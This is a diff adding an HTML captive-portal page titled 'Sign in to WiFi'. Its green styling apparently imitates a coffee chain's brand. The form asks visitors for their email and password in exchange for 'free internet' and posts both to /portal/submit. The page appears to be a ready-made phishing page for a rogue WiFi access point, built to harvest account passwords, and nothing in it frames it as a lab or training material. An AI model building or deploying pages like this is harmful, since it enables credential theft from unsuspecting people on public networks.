@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in to WiFi</title>
+<style>
+  html, body { margin:0; padding:0; height:100%; font-family: -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif; background:#f4f1ec; color:#1e3932; }
+  body { display:flex; align-items:center; justify-content:center; min-height:100vh; }
+  .card { background:#fff; border-radius:4px; box-shadow:0 4px 20px rgba(30,57,50,0.15); width:min(420px, 94%); padding:36px 32px; text-align:center; border-top:6px solid #006241; }
+  .logo { width:56px; height:56px; border-radius:50%; background:#006241; margin:0 auto 18px; display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:22px; letter-spacing:1px; }
+  h1 { font-size:22px; font-weight:600; color:#1e3932; margin:0 0 4px; }
+  .sub { color:#6b6b6b; font-size:13px; margin-bottom:24px; }
+  .form-row { margin:10px 0; text-align:left; }
+  label { display:block; font-size:11px; color:#6b6b6b; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:4px; }
+  input[type=email], input[type=password] { width:100%; padding:12px 14px; font-size:14px; border:1px solid #d4d4d4; border-radius:4px; box-sizing:border-box; background:#fafafa; color:#1e3932; }
+  input:focus { outline:none; border-color:#00754a; background:#fff; }
+  button { width:100%; padding:14px; margin-top:18px; background:#00754a; color:#fff; border:none; border-radius:999px; font-size:15px; font-weight:600; cursor:pointer; letter-spacing:0.3px; }
+  button:hover { background:#006241; }
+  .terms { margin-top:18px; font-size:11px; color:#8a8a8a; line-height:1.5; }
+  .terms a { color:#00754a; text-decoration:none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">WF</div>
+  <h1>Connect to WiFi</h1>
+  <div class="sub">Sign in with your email to get free internet.</div>
+  <form method="POST" action="/portal/submit">
+    <div class="form-row">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" required>
+    </div>
+    <div class="form-row">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+    </div>
+    <button type="submit">Sign in &amp; Connect</button>
+  </form>
+  <div class="terms">By continuing you agree to the <a href="#">Terms of Use</a>.</div>
+</div>
+</body>
+</html>
